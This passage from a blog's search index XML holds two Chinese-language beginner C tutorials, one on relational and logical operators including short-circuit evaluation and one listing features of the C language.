        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="C语言关系运算符与逻辑运算符"><a href="#C语言关系运算符与逻辑运算符" class="headerlink" title="C语言关系运算符与逻辑运算符"></a>C语言关系运算符与逻辑运算符</h2><p>我们使用关系运算符来表示两个数的大小关系<br>常用的关系运算符有以下几种<br>“&lt;”       (小于)<br>“&lt;=”    (小于或等于)<br>“&gt;”    (大于)<br>“&gt;=”    (大于或等于)<br>“==”   (等于)<br>前三个优先级相同（高）<br>后两个优先级相同（低）   </p><h3 id="BTW：单目运算符和双目运算符的区别？"><a href="#BTW：单目运算符和双目运算符的区别？" class="headerlink" title="BTW：单目运算符和双目运算符的区别？"></a>BTW：单目运算符和双目运算符的区别？</h3><p>单目运算符和双目运算符的区别只有一个，那就是操作数（变量或常量）数量的不同。<br>单目运算符只对一个操作数进行逻辑运算。<br>比如： num++(自增) , num–（自减） , !num（取非值） , ~num（按位取反）<br>双目运算符只对两个操作数进行逻辑运算。<br>比如： num1 + num2 , num1 - num2 , num1 &gt; num2<br>除了单目和双目运算符，还有一个三目运算符。<br>三目运算符就是对三个操作数进行逻辑运算。目前三目运算符只有一个：num1 = num1 &gt; 3 ? 1 : 2   </p><p>这段程序的意思是：如果变量num1的值，大于3，那么  变量num1的值就变为1，否则num1的值就<br>变为2  </p><p>关系表达式<br>用关系运算符讲两边的变量，常量，数据或表达式连接起来，称之为关系表达式<br>输出值为布尔类型，1/0，1（真）0（假）<br>  <img src="https://i.loli.net/2020/04/25/pL8295QYhWmJbue.png" alt="QQ截图20200425101000.png">  </p><p>逻辑表达式<br>用逻辑运算符将数据变量常量连接起来，称之为逻辑表达式<br>短路求值<br>逻辑与 &amp;&amp;<br>&amp;&amp; 操作符的左操作数总是首先进行求值, 如果它的值为真, 则继续计算右操作数的值, 然后执行与操作得到表达式结果; 如果它的值为假, 根据与操作 有假则假 的性质可以断定该表达式的值为假, 所以不再计算右操作数的值.<br>逻辑或 ||<br>|| 操作符的左操作数也是首先进行求值, 如果它的值为假, 则继续计算右操作数的值, 然后执行与操作得到表达式结果; 如果它的值为真, 根据或操作 有真则真 的性质可以断定该表达式的值为真, 所以不再计算右操作数的值.  </p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言的特点</title>
      <link href="2020/11/08/C%E8%AF%AD%E8%A8%80%E7%9A%84%E7%89%B9%E7%82%B9/"/>
      <url>2020/11/08/C%E8%AF%AD%E8%A8%80%E7%9A%84%E7%89%B9%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C语言的特点-："><a href="#C语言的特点-：" class="headerlink" title="C语言的特点 ："></a>C语言的特点 ：</h1><h3 id="1、简洁紧凑、灵活方便"><a href="#1、简洁紧凑、灵活方便" class="headerlink" title="1、简洁紧凑、灵活方便"></a>1、简洁紧凑、灵活方便</h3><p>C语言一共只有32个关键字,9种控制语句，程序书写自由，主要用小写字母表示。它把高级语言的基本结构和语句与低级语言的实用性结合起来。 C 语言可以象汇编语言一样对位、字节和地址进行操作, 而这三者是计算机最基本的工作单元。  </p><h3 id="2、运算符丰富"><a href="#2、运算符丰富" class="headerlink" title="2、运算符丰富"></a>2、运算符丰富</h3><p>C的运算符包含的范围很广泛，共有种34个运算符。C语言把括号、赋值、强制类型转换等都作为运算符处理。从而使C的运算类型极其丰富表达式类型多样化，灵活使用各种运算符可以实现在其它高级语言中难以实现的运算。  </p><h3 id="3、数据结构丰富"><a href="#3、数据结构丰富" class="headerlink" title="3、数据结构丰富"></a>3、数据结构丰富</h3><p>C的数据类型有:整型、实型、字符型、数组类型、指针类型、结构体类型、共用体类型等。能用来实现各种复杂的数据类型的运算。并引入了指针概念,使程序效率更高。另外C语言具有强大的图形功能, 支持多种显示器和驱动器。且计算功能、逻辑判断功能强大。   </p><h3 id="4、C是结构式语言"><a href="#4、C是结构式语言" class="headerlink" title="4、C是结构式语言"></a>4、C是结构式语言</h3><p>结构式语言的显著特点是代码及数据的分隔化,即程序的各个部分除了必要的信息交流外彼此独立。这种结构化方式可使程序层次清晰, 便于使用、维护以及调试。C语言是以函数形式提供给用户的,这些函数可方便的调用,并具有多种循环、条件语句控制程序流向,从而使程序完全结构化。  </p><h3 id="5、C语法限制不太严格、程序设计自由度大"><a href="#5、C语法限制不太严格、程序设计自由度大" class="headerlink" title="5、C语法限制不太严格、程序设计自由度大"></a>5、C语法限制不太严格、程序设计自由度大</h3><p>一般的高级语言语法检查比较严，能够检查出几乎所有的语法错误。而C语言允许程序编写者有较大的自由度。   </p><h3 id="6、C语言允许直接访问物理地址，可以直接对硬件进行操作"><a href="#6、C语言允许直接访问物理地址，可以直接对硬件进行操作" class="headerlink" title="6、C语言允许直接访问物理地址，可以直接对硬件进行操作"></a>6、C语言允许直接访问物理地址，可以直接对硬件进行操作</h3><p>因此既具有高级语言的功能，又具有低级语言的许多功能，能够象汇编语言一样对位、字节和地址进行操作,而这三者是计算机最基本的工作单元，可以用来写系统软件。  </p><h3 id="7、C语言程序生成代码质量高，程序执行效率高"><a href="#7、C语言程序生成代码质量高，程序执行效率高" class="headerlink" title="7、C语言程序生成代码质量高，程序执行效率高"></a>7、C语言程序生成代码质量高，程序执行效率高</h3><p>一般只比汇编程序生成的目标代码效率低10へ20%。  </p><h3 id="8、C语言适用范围大，可移植性好"><a href="#8、C语言适用范围大，可移植性好" class="headerlink" title="8、C语言适用范围大，可移植性好"></a>8、C语言适用范围大，可移植性好</h3><p>C语言有一个突出的优点就是适合于多种操作系统, 如DOS、UNIX,也适用于多种机型。<br>用法补充:C语言对操作系统和系统使用程序以及需要对硬件进行操作的场合，用C语言明显优于其它高级语言，许多大型应用软件都是用C语言编写的。 C语言具有绘图能力强，可移植性，并具备很强的数据处理能力，因此适于编写系统软件，三维，二维图形和动画它是数值计算的高级语言。  </p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
